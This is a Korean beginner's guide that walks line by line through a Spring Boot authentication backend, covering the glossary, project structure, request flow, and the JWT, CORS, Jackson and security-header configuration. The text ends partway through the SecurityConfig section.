# 나누미 백엔드 코드 한 줄씩 읽기

> **이 문서는 누구를 위한 것인가**
> 자바를 처음 보거나, 스프링을 처음 쓰는 사람이 **이 프로젝트의 백엔드 코드 전부를 이해할 수 있도록** 쓴 문서입니다.
> 파일 하나하나를 위에서 아래로 따라가며, 모르는 단어가 나올 때마다 그 자리에서 설명합니다.
>
> 구조와 설계 의도를 위에서 내려다보고 싶다면 [backend-code-guide.md](./backend-code-guide.md) 를 보세요.
> 이 문서는 그것보다 **훨씬 느리게, 대신 빠짐없이** 갑니다.

**읽는 방법**
- 처음이라면 `0장`(단어) → `1장`(지도) → `2장`(요청의 길)까지만 읽고, `3장`은 필요할 때 찾아보세요.
- 3장은 **코드가 실제로 도는 순서**가 아니라 **이해하기 쉬운 순서**로 배치했습니다.
- 모든 코드 블록 옆의 숫자 `(1)` `(2)` 는 바로 아래 설명과 짝입니다.

---

## 목차

- [0. 먼저 알아야 할 단어](#0-먼저-알아야-할-단어)
- [1. 전체 지도](#1-전체-지도)
- [2. 요청 한 번이 지나가는 길](#2-요청-한-번이-지나가는-길)
- [3. 파일을 한 줄씩](#3-파일을-한-줄씩)
  - [3-1. `ApiApplication.java` — 프로그램의 시작점](#3-1-apiapplicationjava--프로그램의-시작점)
  - [3-2. `JwtConfig.java` — 설정값을 담는 그릇](#3-2-jwtconfigjava--설정값을-담는-그릇)
  - [3-3. `CorsProperties.java` — 어느 사이트에서 부를 수 있나](#3-3-corspropertiesjava--어느-사이트에서-부를-수-있나)
  - [3-4. `JacksonConfig.java` — JSON 처리기에 부품 끼우기](#3-4-jacksonconfigjava--json-처리기에-부품-끼우기)
  - [3-5. `SecurityConfig.java` — 보안 규칙 조립](#3-5-securityconfigjava--보안-규칙-조립)
  - [3-6. `JwtTokenProvider.java` — 출입증 발급기](#3-6-jwttokenproviderjava--출입증-발급기)
  - [3-7. `JwtAuthenticationFilter.java` — 요청마다 서 있는 문지기](#3-7-jwtauthenticationfilterjava--요청마다-서-있는-문지기)
  - [3-8. `NanumiPasswordProperties.java` — 해시 설정값](#3-8-nanumipasswordpropertiesjava--해시-설정값)
  - [3-9. `NanumiPasswordEncoder.java` — 비밀번호 해싱](#3-9-nanumipasswordencoderjava--비밀번호-해싱)
  - [3-10. `LoginAttemptService.java` — 비밀번호 찍기 막기](#3-10-loginattemptservicejava--비밀번호-찍기-막기)
  - [3-11. `SanitizingStringDeserializer.java` — 들어오는 글자 다듬기](#3-11-sanitizingstringdeserializerjava--들어오는-글자-다듬기)
  - [3-12. `AuthController.java` — 요청을 받는 입구](#3-12-authcontrollerjava--요청을-받는-입구)
  - [3-13. DTO — 주고받는 데이터의 모양](#3-13-dto--주고받는-데이터의-모양)
  - [3-14. 검증 — 값이 규칙에 맞는지 보기](#3-14-검증--값이-규칙에-맞는지-보기)
  - [3-15. `AuthService.java` — 실제로 판단하는 곳](#3-15-authservicejava--실제로-판단하는-곳)
  - [3-16. 엔티티 — DB 표를 자바 클래스로](#3-16-엔티티--db-표를-자바-클래스로)
  - [3-17. 리포지토리 — DB 에 묻는 창구](#3-17-리포지토리--db-에-묻는-창구)
  - [3-18. 예외 처리 — 오류를 한 모양으로](#3-18-예외-처리--오류를-한-모양으로)
  - [3-19. `application.yml` — 설정 파일](#3-19-applicationyml--설정-파일)
- [4. 기능별로 따라가 보기](#4-기능별로-따라가-보기)
- [5. 어노테이션 사전](#5-어노테이션-사전)
- [6. 입문자가 자주 막히는 질문](#6-입문자가-자주-막히는-질문)

---

## 0. 먼저 알아야 할 단어

여기 나오는 단어를 모르면 3장이 외국어처럼 보입니다. **한 번 훑고 넘어갔다가, 막힐 때 돌아오세요.**

### 0-1. 서버와 API

| 단어 | 쉽게 말하면 |
|---|---|
| **서버(server)** | 요청을 받아서 답을 돌려주는 프로그램. 이 프로젝트의 백엔드가 서버입니다 |
| **클라이언트(client)** | 요청을 보내는 쪽. 여기서는 브라우저에서 도는 React 화면 |
| **API** | 서버가 "이런 주소로 이렇게 보내면 이렇게 답해 줄게"라고 정해 둔 창구 목록 |
| **엔드포인트(endpoint)** | 창구 하나. 예: `POST /api/auth/login` |
| **HTTP 메서드** | 요청의 종류. `GET`(조회), `POST`(보내기/생성), `PUT`/`PATCH`(수정), `DELETE`(삭제) |
| **요청 본문(request body)** | 요청에 딸려 보내는 데이터 덩어리. 보통 JSON |
| **헤더(header)** | 본문과 별개로 붙이는 꼬리표. 예: `Authorization: Bearer eyJ...` |
| **상태 코드(status code)** | 답의 종류를 나타내는 숫자. 200 성공, 201 만들어짐, 400 요청이 잘못됨, 401 로그인 안 됨, 403 권한 없음, 404 없음, 409 이미 있음, 429 너무 많이 시도함, 500 서버가 터짐 |

**JSON** 은 데이터를 글자로 적는 약속입니다.

```json
{ "email": "test@a.com", "password": "nanumi1234!" }
```

### 0-2. 자바 문법 최소한

| 단어 | 쉽게 말하면 |
|---|---|
| **클래스(class)** | 데이터와 기능을 묶어 둔 설계도. 파일 하나당 보통 클래스 하나 |
| **필드(field)** | 클래스가 들고 있는 값. `private String email;` |
| **메서드(method)** | 클래스가 할 줄 아는 일. `public String encode(...) { ... }` |
| **`private` / `public`** | `private` 은 이 클래스 안에서만 쓸 수 있음, `public` 은 밖에서도 부를 수 있음 |
| **`static`** | 객체를 만들지 않아도 쓸 수 있음. 클래스 전체가 하나만 공유 |
| **`final`** | 한 번 정하면 못 바꿈. 실수로 바꾸는 걸 컴파일 단계에서 막아 줍니다 |
| **`enum`** | 정해진 몇 가지 중 하나만 고를 수 있는 타입. 예: `USER`, `ADMIN` |
| **`record`** | 값만 담는 클래스를 한 줄로 만드는 문법 (자세히는 [3-13](#3-13-dto--주고받는-데이터의-모양)) |
| **인터페이스(interface)** | "이런 메서드들이 있어야 한다"는 약속만 적어 둔 것. 실제 내용은 구현 클래스가 채웁니다 |
| **`implements`** | "나는 저 약속을 지키겠다"는 선언 |
| **`extends`** | "저 클래스의 기능을 물려받겠다"는 선언 |
| **예외(exception)** | 정상 흐름을 멈추고 위로 튕겨 올리는 오류 신호. `throw` 로 던지고 `catch` 로 받습니다 |
| **`Optional<T>`** | "값이 있을 수도, 없을 수도 있음"을 타입으로 표현한 상자. `null` 을 깜빡하고 안 보는 실수를 막아 줍니다 |

**람다(`->`)** 는 "짧은 함수"를 그 자리에 적는 문법입니다.

```java
auth -> auth.anyRequest().authenticated()
// "auth 를 받으면, auth.anyRequest().authenticated() 를 하는 함수"
```

**메서드 참조(`::`)** 는 람다를 더 짧게 쓴 것입니다. `FieldError::getDefaultMessage` 는 `x -> x.getDefaultMessage()` 와 같습니다.

### 0-3. 스프링 부트

**스프링 부트**는 서버를 만들 때 반복되는 일을 대신 해 주는 도구 모음입니다.

| 단어 | 쉽게 말하면 |
|---|---|
| **어노테이션(annotation)** | `@` 로 시작하는 표시. 코드에 붙이는 **스티커**라고 생각하세요. 스프링이 이 스티커를 보고 알아서 일을 합니다 |
| **빈(bean)** | 스프링이 **대신 만들어서 보관해 주는 객체**. `@Component`, `@Service` 같은 스티커가 붙은 클래스가 빈이 됩니다 |
| **의존성 주입(DI)** | 필요한 객체를 내가 `new` 로 만들지 않고, 스프링이 **넣어 주는** 것 |
| **컨트롤러(Controller)** | 요청을 받는 입구 |
| **서비스(Service)** | 실제 판단과 처리를 하는 곳 |
| **리포지토리(Repository)** | DB 에 묻는 창구 |
| **필터(Filter)** | 컨트롤러에 닿기 **전에** 모든 요청이 지나가는 검문소 |
| **프로필(profile)** | 실행 환경 이름. 이 프로젝트는 `dev`(개발)와 `prod`(운영) 두 개 |

**의존성 주입이 왜 좋은가** — 직접 만들면 이렇게 됩니다.

```java
// 이렇게 하면: AuthService 가 AuthService 를 만드는 법까지 다 알아야 함
AuthService service = new AuthService(
    new UserRepository(...), new AccountRepository(...), new NanumiPasswordEncoder(...), ...);
```

스프링에 맡기면 이렇게 됩니다.

```java
@Service
@RequiredArgsConstructor           // 롬복이 생성자를 만들어 줌
public class AuthService {
  private final UserRepository userEntityRepository;   // 스프링이 알아서 넣어 줌
}
```

### 0-4. 롬복(Lombok)

자바는 똑같은 코드를 많이 적어야 해서, **롬복**이 그걸 대신 만들어 줍니다. 컴파일할 때 코드가 생겨나므로, 소스에는 안 보이지만 실제로는 있습니다.

| 어노테이션 | 대신 만들어 주는 것 |
|---|---|
| `@Getter` | 모든 필드의 `getXxx()` |
| `@Setter` | 모든 필드의 `setXxx(값)` |
| `@RequiredArgsConstructor` | **아직 값이 없는 `final` 필드**만 받는 생성자 |
| `@NoArgsConstructor` | 아무것도 안 받는 생성자 |
| `@Builder` | `A.builder().b(1).c(2).build()` 형태로 객체를 만드는 기능 |
| `@Slf4j` | `log.info(...)` 로 기록을 남길 수 있는 `log` 변수 |

> `@RequiredArgsConstructor` 의 규칙을 정확히 알아 두면 좋습니다.
> **선언과 동시에 값이 채워진 `final` 필드는 생성자에 들어가지 않습니다.**
> ```java
> private final NanumiPasswordProperties properties;                      // 값 없음 → 생성자 파라미터가 됨
> private final BCryptPasswordEncoder legacy = new BCryptPasswordEncoder(); // 이미 채워짐 → 제외
> ```

### 0-5. 데이터베이스와 JPA

| 단어 | 쉽게 말하면 |
|---|---|
| **DB(데이터베이스)** | 데이터를 표(table) 모양으로 저장해 두는 프로그램 |
| **테이블 / 컬럼 / 행** | 표 / 표의 열(항목) / 표의 한 줄(데이터 하나) |
| **기본키(primary key)** | 행을 하나로 특정하는 번호. 여기서는 `id` |
| **유니크 제약(unique)** | "이 컬럼에는 같은 값이 두 번 들어올 수 없다"는 DB 차원의 규칙 |
| **JPA** | 자바 객체와 DB 표를 자동으로 연결해 주는 기술. SQL 을 직접 안 써도 됩니다 |
| **엔티티(Entity)** | DB 표 하나와 짝이 되는 자바 클래스 |
| **영속성 컨텍스트** | JPA 가 "지금 다루는 중인 엔티티"를 모아 두는 작업대 |
| **변경 감지(dirty checking)** | 작업대 위 엔티티의 값이 바뀌면, **`save()` 를 안 불러도** 트랜잭션이 끝날 때 자동으로 `UPDATE` 가 나가는 기능 |
| **트랜잭션(transaction)** | "다 되거나, 다 안 되거나". 중간에 실패하면 앞의 것까지 되돌립니다(롤백) |

> **변경 감지는 입문자가 가장 많이 놀라는 부분입니다.** 이 프로젝트 곳곳에서 `save()` 없이 값만 바꾸는데 DB 에 반영됩니다. [6장 FAQ](#6-입문자가-자주-막히는-질문)에서 다시 설명합니다.

### 0-6. 보안 단어

| 단어 | 쉽게 말하면 |
|---|---|
| **해시(hash)** | 값을 되돌릴 수 없는 형태로 바꾸는 것. `1234` → `a1b2c3...`. 거꾸로 원래 값을 알아낼 수 없습니다 |
| **salt(소금)** | 비밀번호마다 새로 뽑는 무작위 값. 같은 비밀번호라도 해시가 달라지게 만듭니다 |
| **pepper(후추)** | 서버만 아는 비밀값. DB 에 저장하지 않습니다 |
| **JWT** | 서버가 서명해서 발급하는 **출입증 문자열**. 안에 "누구인지"가 적혀 있고, 서명 덕분에 위조할 수 없습니다 |
| **액세스 토큰** | API 를 부를 때 내미는 짧은 수명(15분) 출입증 |
| **리프레시 토큰** | 액세스 토큰이 만료됐을 때 새로 받아오는 긴 수명(14일) 열쇠 |
| **무차별 대입(brute force)** | 비밀번호를 계속 바꿔 가며 찍어 보는 공격 |
| **XSS** | 남이 적은 글에 스크립트를 심어서 다른 사람 브라우저에서 실행시키는 공격 |
| **CORS** | 브라우저가 "다른 주소의 서버를 함부로 못 부르게" 막는 규칙 |
| **CSRF** | 로그인된 브라우저를 속여서 원치 않는 요청을 보내게 하는 공격 |

---

## 1. 전체 지도

### 1-1. 이 서버가 하는 일

지금 구현된 것은 **회원 기능 다섯 개**뿐입니다.

| 창구 | 하는 일 | 로그인 필요? |
|---|---|---|
| `POST /api/auth/signup` | 회원가입 | ❌ |
| `POST /api/auth/login` | 로그인 (토큰 두 개 받음) | ❌ |
| `POST /api/auth/refresh` | 토큰 재발급 | ❌ (리프레시 토큰을 본문에 담음) |
| `POST /api/auth/logout` | 로그아웃 | ✅ |
| `POST /api/auth/withdrawal` | 회원탈퇴 | ✅ |

### 1-2. 폴더 구조

```
backend/api/src/main/java/com/nanumi/api/
├── ApiApplication.java          ← 프로그램 시작점
│
├── config/                      ← 설정
│   ├── JwtConfig.java               토큰 설정값
│   ├── CorsProperties.java          허용 출처 설정값
│   ├── JacksonConfig.java           JSON 처리기 설정
│   └── SecurityConfig.java          보안 규칙 (제일 중요)
│
├── controller/
│   └── AuthController.java      ← 요청을 받는 입구
│
├── service/
│   └── AuthService.java         ← 실제로 판단하는 곳 (제일 중요)
│
├── repository/                  ← DB 창구
│   ├── UserRepository.java
│   └── AccountRepository.java
│
├── entity/                      ← DB 표와 짝이 되는 클래스
│   ├── User.java                    사람 정보 (닉네임, 아파트)
│   └── Account.java                 로그인 정보 (이메일, 비밀번호)
│
├── dto/                         ← 주고받는 데이터의 모양
│   ├── request/                     받는 것 4개
│   └── response/                    주는 것 7개
│
├── security/
│   ├── JwtTokenProvider.java        토큰 발급·검증
│   ├── JwtAuthenticationFilter.java 요청마다 도는 문지기
│   ├── LoginAttemptService.java     로그인 시도 횟수 세기
│   ├── password/
│   │   ├── NanumiPasswordEncoder.java     비밀번호 해싱
│   │   └── NanumiPasswordProperties.java  해싱 설정값
│   └── xss/
│       └── SanitizingStringDeserializer.java  들어오는 글자 다듬기
│
├── validation/                  ← 값이 규칙에 맞는지 검사
│   ├── annotation/                  스티커 4개 (@ValidEmail 등)
│   └── validator/                   실제 검사 코드 4개
│
└── exception/                   ← 오류 처리
    ├── ErrorCode.java               오류 목록
    ├── CustomException.java         우리가 던지는 예외
    └── GlobalExceptionHandler.java  예외를 JSON 응답으로 바꿈
```

### 1-3. 왜 이렇게 나누나

한 파일에 다 적으면 안 되나요? — **됩니다. 처음엔 돌아갑니다.** 그런데 곧 이런 일이 생깁니다.

- 오류 메시지를 고치려는데 어느 파일에 있는지 못 찾음
- 로그인 로직을 고쳤더니 회원가입이 깨짐
- 테스트를 짜려는데 DB 없이는 아무것도 못 돌림

그래서 **역할별로 층(layer)을 나눕니다.**

```
컨트롤러  ← HTTP 만 안다 (주소, 상태 코드). 판단은 안 한다
   ↓
서비스    ← 판단만 한다. HTTP 도 SQL 도 모른다
   ↓
리포지토리 ← DB 만 안다
```

**규칙은 딱 하나: 위에서 아래로만 부른다.** 서비스가 컨트롤러를 부르면 안 됩니다.

---

## 2. 요청 한 번이 지나가는 길

`POST /api/auth/login` 을 예로, 요청이 지나가는 순서입니다.

```
브라우저
  │  POST /api/auth/login   { "email": "...", "password": "..." }
  ▼
┌──────────────────────────────────────────────────────────┐
│ ① CORS 검사                        SecurityConfig        │
│    "이 사이트에서 부르는 게 허용됐나?"                        │
├──────────────────────────────────────────────────────────┤
│ ② JwtAuthenticationFilter                                │
│    Authorization 헤더에 토큰이 있으면 누구인지 알아 둠         │
│    (로그인 요청엔 토큰이 없으므로 그냥 통과)                    │
├──────────────────────────────────────────────────────────┤
│ ③ 접근 권한 검사                   SecurityConfig          │
│    /api/auth/login 은 permitAll → 통과                    │
├──────────────────────────────────────────────────────────┤
│ ④ JSON → 자바 객체                                        │
│    이때 SanitizingStringDeserializer 가 글자를 다듬음        │
├──────────────────────────────────────────────────────────┤
│ ⑤ @Valid 검증                     LoginRequest           │
│    비었나? 너무 긴가?  → 틀리면 400                         │
└──────────────────────────────────────────────────────────┘
  ▼
AuthController.login()      IP 를 알아내서 서비스에 넘김
  ▼
AuthService.login()         ← 여기서 실제 판단
  │  1. 잠겨 있나?        LoginAttemptService
  │  2. 계정이 있나?      AccountRepository
  │  3. 비밀번호가 맞나?  NanumiPasswordEncoder
  │  4. 탈퇴한 회원인가?  User
  │  5. 토큰 두 개 발급   JwtTokenProvider
  ▼
LoginResponse  →  JSON  →  브라우저
```

**오류가 나면** 어디서 나든 `GlobalExceptionHandler` 가 받아서 **항상 같은 모양**으로 바꿔 줍니다.

```json
{ "status": 401, "message": "이메일 또는 비밀번호가 올바르지 않습니다." }
```

### 2-1. 어디서 무엇이 걸러지나

| 단계 | 거르는 것 | 못 걸러서 통과하면 |
|---|---|---|
| CORS | 허용 안 된 사이트에서 온 브라우저 요청 | 아무 사이트나 우리 API 를 부름 |
| JWT 필터 | 토큰이 없거나 위조됨 | 남의 계정으로 행세 |
| 정제기 | 보이지 않는 글자, 전각 문자 | `ａdmin` 으로 닉네임 중복 검사 우회 |
| `@Valid` | 형식이 틀린 값 | 이상한 데이터가 DB 에 들어감 |
| 서비스 | 중복, 비밀번호 불일치, 탈퇴 회원 | 논리적으로 말이 안 되는 상태 |
| DB 제약 | 위에서 놓친 중복 | 같은 이메일 계정이 두 개 |

**같은 것을 여러 번 막습니다.** 한 겹이 뚫려도 다음 겹이 막게 하려는 것이고, 이걸 다층 방어(defense in depth)라고 부릅니다.

---
## 3. 파일을 한 줄씩

### 3-1. `ApiApplication.java` — 프로그램의 시작점

전체 14줄. 자바 프로그램은 `main` 메서드에서 시작하는데, 그 `main` 이 여기 있습니다.

```java
package com.nanumi.api;                                                    // (1)

import org.springframework.boot.SpringApplication;                         // (2)
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.data.jpa.repository.config.EnableJpaAuditing;

@SpringBootApplication                                                     // (3)
@EnableJpaAuditing                                                         // (4)
public class ApiApplication {

  public static void main(String[] args) {                                 // (5)
    SpringApplication.run(ApiApplication.class, args);                      // (6)
  }
}
```

1. **`package`** — 이 파일이 어느 폴더(묶음)에 속하는지 적습니다. 폴더 경로와 똑같아야 합니다.
2. **`import`** — 다른 곳에 있는 클래스를 가져다 쓰겠다는 선언. 안 적으면 그 이름을 못 씁니다.
3. **`@SpringBootApplication`** — 스티커 하나에 세 가지가 들어 있습니다.
   - `@ComponentScan` : **이 파일이 있는 패키지와 그 아래를 전부 뒤져서**, `@Component`·`@Service`·`@RestController` 같은 스티커가 붙은 클래스를 찾아 빈으로 만듭니다. 그래서 우리가 만든 클래스들이 저절로 연결됩니다.
   - `@EnableAutoConfiguration` : 라이브러리 구성을 보고 필요한 설정을 알아서 해 줍니다. (DB 라이브러리가 있으면 DB 연결을 준비하는 식)
   - `@Configuration` : 이 클래스 자체도 설정으로 쓸 수 있게 합니다.
4. **`@EnableJpaAuditing`** — 엔티티의 `@CreatedDate` / `@LastModifiedDate` 를 **실제로 동작하게** 켜는 스위치입니다. 이게 없으면 `createdAt`, `updatedAt` 이 `null` 인 채로 저장되려다 실패합니다. ([3-16](#3-16-엔티티--db-표를-자바-클래스로) 참고)
5. **`main`** — 자바 프로그램의 시작점. `public static void main(String[] args)` 라는 모양이 정해져 있습니다.
6. **`SpringApplication.run(...)`** — 스프링을 띄웁니다. 이 한 줄이 하는 일:
   - 패키지를 뒤져 빈을 전부 만들고
   - 서로 필요한 객체를 연결(주입)하고
   - 내장 웹 서버(Tomcat)를 8080 포트에 띄우고
   - `@PostConstruct` 가 붙은 메서드들을 실행합니다

> **`@PostConstruct`** 는 "빈이 다 만들어진 직후에 한 번 실행"이라는 뜻입니다. 이 프로젝트에서는 두 군데에 있습니다 — 키 파일을 읽는 [`JwtTokenProvider.init()`](#3-6-jwttokenproviderjava--출입증-발급기) 과 더미 해시를 미리 만드는 [`AuthService.initDummyPasswordHash()`](#3-15-authservicejava--실제로-판단하는-곳).

---

### 3-2. `JwtConfig.java` — 설정값을 담는 그릇

`application.yml` 에 적어 둔 값을 자바에서 꺼내 쓰기 위한 클래스입니다.

```java
@Getter                                                    // (1)
@Setter
@Component                                                 // (2)
@ConfigurationProperties(prefix = "jwt")                   // (3)
public class JwtConfig {

  private String privateKeyPath;                           // (4)
  private String publicKeyPath;
  private long accessTokenExpiration;                      // (5)
  private long refreshTokenExpiration;
}
```

1. **`@Getter @Setter`** — 롬복이 `getPrivateKeyPath()`, `setPrivateKeyPath(...)` 같은 메서드를 만들어 줍니다. **setter 가 반드시 있어야** 스프링이 값을 꽂을 수 있습니다.
2. **`@Component`** — 이 클래스를 빈으로 만들라는 표시. 그래야 다른 곳에서 주입받을 수 있습니다.
3. **`@ConfigurationProperties(prefix = "jwt")`** — `application.yml` 의 `jwt:` 아래 값을 필드에 자동으로 넣습니다. 이름 규칙은 **케밥 케이스 → 카멜 케이스**:

   ```yaml
   jwt:
     private-key-path: classpath:keys/private_key.pem   →  privateKeyPath
     access-token-expiration: 900000                    →  accessTokenExpiration
   ```
4. **키 파일 경로** — 토큰에 서명할 때 쓰는 열쇠 파일 위치입니다. `classpath:` 로 시작하면 "프로젝트 안 `resources` 폴더에서 찾아라"는 뜻입니다.
5. **만료 시간** — 단위는 **밀리초**입니다. `900000` = 900초 = 15분, `1209600000` = 14일.

---

### 3-3. `CorsProperties.java` — 어느 사이트에서 부를 수 있나

```java
@Getter
@Setter
@Component
@ConfigurationProperties(prefix = "nanumi.security.cors")
public class CorsProperties {

  private List<String> allowedOrigins = new ArrayList<>();                     // (1)

  private List<String> allowedMethods =
      new ArrayList<>(List.of("GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS")); // (2)

  private List<String> allowedHeaders = new ArrayList<>(List.of("Authorization", "Content-Type")); // (3)

  private boolean allowCredentials = false;                                   // (4)

  private long maxAge = 3600;                                                 // (5)
}
```

**CORS 가 뭔가요?** 브라우저에는 "지금 보고 있는 사이트와 **다른 주소**의 서버는 함부로 못 부른다"는 규칙이 있습니다. 악성 사이트가 몰래 우리 API 를 부르는 걸 막기 위한 것입니다. 그래서 서버가 "이 주소에서 오는 건 괜찮다"고 **명시적으로 허락**해 줘야 합니다.

이 프로젝트는 프런트가 `localhost:5173`(Vite), 백엔드가 `localhost:8080` 이라 **주소가 다릅니다.** 그래서 설정이 필요합니다.

1. **`allowedOrigins`** — 허락할 주소 목록. **기본값이 빈 목록**이라, 설정을 안 하면 아무 데서도 못 부릅니다. "실수로 열어 두는 것"보다 "실수로 막혀 있는 것"이 안전하기 때문입니다.
2. **`allowedMethods`** — 허락할 HTTP 메서드. `OPTIONS` 가 들어 있는 이유는, 브라우저가 진짜 요청을 보내기 전에 `OPTIONS` 로 먼저 물어보기 때문입니다(preflight, 사전 요청).
3. **`allowedHeaders`** — 허락할 헤더. 토큰을 실어 보내야 하므로 `Authorization` 이 꼭 필요합니다.
4. **`allowCredentials = false`** — 쿠키를 주고받지 않겠다는 뜻. 이 프로젝트는 토큰을 헤더로 보내므로 쿠키가 필요 없고, 꺼 두면 CSRF 걱정도 줄어듭니다.
5. **`maxAge = 3600`** — 사전 요청 결과를 브라우저가 1시간 동안 기억합니다. 매번 물어보지 않아 빨라집니다.

---

### 3-4. `JacksonConfig.java` — JSON 처리기에 부품 끼우기

```java
@Configuration                                                      // (1)
public class JacksonConfig {

  @Bean                                                             // (2)
  public JacksonModule sanitizingStringModule() {
    SimpleModule module = new SimpleModule("nanumi-sanitizing-string");  // (3)
    module.addDeserializer(String.class, new SanitizingStringDeserializer()); // (4)
    return module;
  }
}
```

**Jackson** 은 JSON 과 자바 객체를 서로 바꿔 주는 라이브러리입니다. 스프링이 기본으로 씁니다.

1. **`@Configuration`** — "이 클래스 안에 빈을 만드는 방법이 적혀 있다"는 표시.
2. **`@Bean`** — 이 메서드가 **돌려주는 객체를 빈으로 등록**하라는 뜻. `@Component` 는 클래스에 붙이고, `@Bean` 은 **직접 만들어야 하는 객체**에 씁니다. (라이브러리 클래스처럼 우리가 스티커를 못 붙이는 경우)
3. **모듈** — Jackson 에 끼우는 부품 묶음입니다. 이름은 구분용입니다.
4. **핵심 한 줄** — "JSON 에서 **문자열**을 읽을 때는 우리가 만든 `SanitizingStringDeserializer` 를 써라"고 등록합니다.

이 한 줄 덕분에 **요청 본문의 모든 문자열**이 자동으로 다듬어집니다. 필드마다 일일이 `trim()` 을 부를 필요가 없고, 새 DTO 를 만들어도 빠뜨릴 일이 없습니다. → [3-11](#3-11-sanitizingstringdeserializerjava--들어오는-글자-다듬기)

---

### 3-5. `SecurityConfig.java` — 보안 규칙 조립

**이 프로젝트에서 가장 중요한 설정 파일**입니다. "어떤 요청을 통과시킬지, 어떤 검문소를 세울지"를 전부 여기서 정합니다.

#### 맨 위 상수

```java
@Configuration
@EnableWebSecurity                                                        // (1)
public class SecurityConfig {

  private static final String CONTENT_SECURITY_POLICY =
      "default-src 'none'; frame-ancestors 'none'; base-uri 'none'; form-action 'none'"; // (2)

  private static final String PERMISSIONS_POLICY =
      "geolocation=(), camera=(), microphone=(), payment=(), usb=()";      // (3)

  private static final long HSTS_MAX_AGE_SECONDS = 31_536_000L;            // (4)
```

1. **`@EnableWebSecurity`** — 스프링 시큐리티를 켭니다.
2. **CSP(Content-Security-Policy)** — 브라우저에게 "이 응답에서는 아무것도 불러오지 마라"고 알리는 헤더입니다. 우리는 JSON 만 돌려주므로 전부 `'none'` 으로 잠급니다. 혹시 응답이 HTML 로 해석되는 상황이 생겨도 스크립트가 못 돌게 하는 안전장치입니다.
3. **Permissions-Policy** — 위치·카메라·마이크 같은 브라우저 기능을 전부 끕니다. 쓸 일이 없으니 닫아 둡니다.
4. **HSTS 기간** — 1년(31,536,000초). 브라우저에게 "앞으로 1년간 이 사이트는 무조건 HTTPS 로만 접속해라"라고 알립니다. `31_536_000L` 의 밑줄은 **자릿수 구분용**이고 값에는 영향이 없습니다. 끝의 `L` 은 "이 숫자는 `long` 타입"이라는 표시입니다.

#### 필터 체인 ①: H2 콘솔 (개발 전용)

```java
  @Bean
  @Order(Ordered.HIGHEST_PRECEDENCE)                                      // (1)
  @Profile("dev")                                                         // (2)
  public SecurityFilterChain h2ConsoleFilterChain(HttpSecurity http) throws Exception {
    http.securityMatcher("/h2-console/**")                                // (3)
        .csrf(csrf -> csrf.disable())
        .headers(headers -> headers.frameOptions(frame -> frame.sameOrigin())) // (4)
        .authorizeHttpRequests(auth -> auth.anyRequest().permitAll());     // (5)

    return http.build();
  }
```

**필터 체인**은 "이런 주소에는 이런 규칙을 적용한다"는 묶음입니다. 이 프로젝트에는 **두 개**가 있습니다.

1. **`@Order(HIGHEST_PRECEDENCE)`** — 가장 먼저 검사되는 체인. 숫자가 작을수록 먼저입니다.
2. **`@Profile("dev")`** — **개발 환경에서만** 이 빈을 만듭니다. 운영에서는 아예 존재하지 않습니다.
3. **`securityMatcher`** — "이 체인은 `/h2-console/` 로 시작하는 주소만 담당한다".
4. **`frameOptions.sameOrigin()`** — H2 콘솔 화면이 `iframe` 을 쓰기 때문에 이걸 풀어 줘야 합니다.
5. 개발용 DB 콘솔이므로 전부 통과시킵니다.

> **왜 체인을 나눴나** — `frameOptions` 를 푸는 건 클릭재킹(다른 사이트가 우리 화면을 투명하게 덮어씌워 클릭을 가로채는 공격)에 열리는 일입니다. 아래 API 체인에 같이 넣었다면 **운영에서도 풀려 버립니다.** 그래서 체인을 아예 분리하고, 개발 프로필에서만 만들어지게 했습니다.

#### 필터 체인 ②: API 본체

```java
  @Bean
  @Order(Ordered.HIGHEST_PRECEDENCE + 1)                                  // 두 번째
  public SecurityFilterChain securityFilterChain(
      HttpSecurity http,
      JwtTokenProvider jwtTokenProvider,                                  // (0)
      CorsConfigurationSource corsConfigurationSource)
      throws Exception {
```

0. **파라미터로 받는 것도 주입입니다.** `@Bean` 메서드의 파라미터는 스프링이 알아서 채워 줍니다.

```java
    http.csrf(csrf -> csrf.disable())                                     // (1)
        .cors(cors -> cors.configurationSource(corsConfigurationSource))  // (2)
        .sessionManagement(
            session -> session.sessionCreationPolicy(SessionCreationPolicy.STATELESS)) // (3)
```

1. **CSRF 끄기** — CSRF 공격은 **브라우저가 쿠키를 자동으로 붙여 보내는 성질**을 이용합니다. 우리는 쿠키를 안 쓰고 `Authorization` 헤더에 토큰을 직접 담으며, 헤더는 자동으로 붙지 않습니다. 그래서 끄는 게 맞습니다.
   > ⚠️ 쿠키로 토큰을 옮기는 방식으로 바꾼다면 **반드시 다시 켜야 합니다.**
2. **CORS 적용** — 아래에서 만드는 `corsConfigurationSource` 설정을 씁니다.
3. **`STATELESS`** — **세션을 아예 만들지 않습니다.**
   - 세션 방식: 서버가 "누가 로그인했는지"를 메모리에 들고 있음 → 서버를 여러 대로 늘리면 공유가 어려움
   - 토큰 방식: 서버는 아무것도 기억하지 않고, **요청에 딸려 온 토큰만 보고** 매번 판단함 → 서버를 늘리기 쉬움

```java
        .authorizeHttpRequests(
            auth ->
                auth.requestMatchers("/api/auth/signup", "/api/auth/login", "/api/auth/refresh")
                    .permitAll()                                          // (4)
                    .anyRequest()
                    .authenticated())                                     // (5)
```

4. **`permitAll`** — 이 세 개는 로그인 전에 불러야 하므로 토큰 없이 통과.
5. **`anyRequest().authenticated()`** — **그 밖의 모든 요청은 로그인 필수.**

   > 순서가 중요합니다. `anyRequest()` 를 먼저 적으면 그 아래 규칙은 영영 안 걸립니다. **좁은 규칙부터, 넓은 규칙은 마지막에.**
   > 그리고 이 방식은 **"기본은 막고, 필요한 것만 연다"** 입니다. 새 API 를 추가했을 때 깜빡해도 **자동으로 보호됩니다.**

```java
        .headers(
            headers ->
                headers
                    .contentSecurityPolicy(csp -> csp.policyDirectives(CONTENT_SECURITY_POLICY))
                    .frameOptions(frame -> frame.deny())                  // (6)
                    .referrerPolicy(referrer -> referrer.policy(ReferrerPolicy.NO_REFERRER)) // (7)
                    .httpStrictTransportSecurity(
                        hsts -> hsts.includeSubDomains(true).maxAgeInSeconds(HSTS_MAX_AGE_SECONDS)) // (8)
                    .addHeaderWriter(
                        new StaticHeadersWriter("Permissions-Policy", PERMISSIONS_POLICY))) // (9)
```

6. **`frameOptions.deny()`** — 어떤 사이트도 우리 응답을 `iframe` 안에 넣지 못하게 합니다(클릭재킹 방지).
